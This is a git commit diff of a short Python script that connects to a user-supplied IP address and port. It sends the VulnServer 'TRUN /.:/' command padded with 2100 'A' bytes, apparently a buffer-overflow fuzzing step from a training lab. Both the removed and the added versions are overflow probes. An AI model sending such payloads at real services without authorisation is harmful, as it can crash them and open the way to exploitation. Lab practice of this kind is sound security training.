c8df85557c6b0753d525d912362df2dd54fe3743
Hrishi Ghosalkar <87890571+rookie-cookie-8@users.noreply.github.com>
2024-05-29 18:43:03 +0530

    Update fuzzing-2.py

--- fuzzing-2.py
+++ fuzzing-2.py
@@ -1,66 +1,30 @@
 #!/usr/bin/python3
-
 import sys,socket
 from time import sleep
 
+print("************VulnServer TRUN**********")
 
-print("****************Vuln_Server Vulnerability*************")
-sleep(0.5)
-ip_address=input("Enter the IP address:\n")
-port_number=input("Enter the port number:\n")
+ip_address=input("Enter the IP address\n")
+port_number=input("Enter the port number\n")
 
-if(len(ip_address)<=0) or (len(port_number)<=0):
-    if(len(ip_address)>0) and (len(port_number)<=0):
-        print("*"*30)
+if (len(ip_address)<=0) or (len(port_number)<=0):
+    if (len(ip_address)>0) and (len(port_number)<=0):
+        print("*" * 30)
         print("Port number field is empty")
-    elif(len(ip_address)<=0) and (len(port_number)>0):
-        print("*"*30)
+    elif (len(ip_address)<=0) and (len(port_number)>0):
+        print("*" * 30)
         print("IP Address field is empty")
+    elif (len(ip_address)<=0) and (len(port_number)<=0):
+        print("*" * 30)
+        print("IP Address field is empty")
+        print("Port number field is empty")
     else:
-        print("*"*30)
+        print("*" * 30)
         print("Issues with the user input")
-elif(len(ip_address)>0) or (len(port_number)>0):
-        print("*"*30)
-        buffer=2100
-        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        s.connect((ip_address, int(port_number)))
-        print(f"Sending buffer --> {buffer}")
-        s.send((b"TRUN /.:/" + b"A" *buffer + b"\r\n"))
-        s.close()
-----------------------------------------------------------------------------------
-#!/usr/bin/python3
-
-import sys,socket
-
-ip_address=input("Enter the IP address:\n")
-port_number=input("Enter the Port number:\n")
-command_name=input("Enter the command name:\n")
-
-if (len(ip_address)<=0) or (len(port_number)<=0) or (len(command_name)<=0):
-    if (len(ip_address)>0) and (len(port_number)<=0) and (len(command_name)<=0):
-        print("Port number field is empty")
-        print("Command name field is empty")
-    elif (len(ip_address)>0) and (len(port_number)>0) and (len(command_name)<=0):
-        print("Command name field is empty")
-    elif (len(ip_address)>0) and (len(port_number)<=0) and (len(command_name)>0):
-        print("Port number field is empty")
-    elif (len(ip_address)<=0) and (len(port_number)<=0) and (len(command_name)>0):
-        print("IP address field is empty")
-        print("Port number field is empty")
-    elif (len(ip_address)<=0) and (len(port_number)>0) and (len(command_name)<=0):
-        print("IP address field is empty")
-        print("Command name field is empty")
-    elif (len(ip_address)<=0) and (len(port_number)>0) and (len(command_name)>0):
-        print("IP address field is empty")
-    elif (len(ip_address)<=0) and (len(port_number)<=0) and (len(command_name)<=0):
-        print("IP address field is empty")
-        print("Port number field is empty")
-        print("Command name field is empty")
-elif (len(ip_address)>0) and (len(port_number)>0) and (len(command_name)>0):
-    print("*" * 30)
-    buffer=2100
+else:
+    size=2100
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.connect((ip_address, int(port_number)))
-    print(f'Sending buffer --> {buffer}')
-    s.send(bytes(command_name, 'utf-8') + b" /.:/" + b"A" * buffer + b"\r\n")
-    s.close
+    print(f"Sending buffer --> {size}")
+    s.send(b"TRUN /.:/" + b"A"*size)
+    s.close()
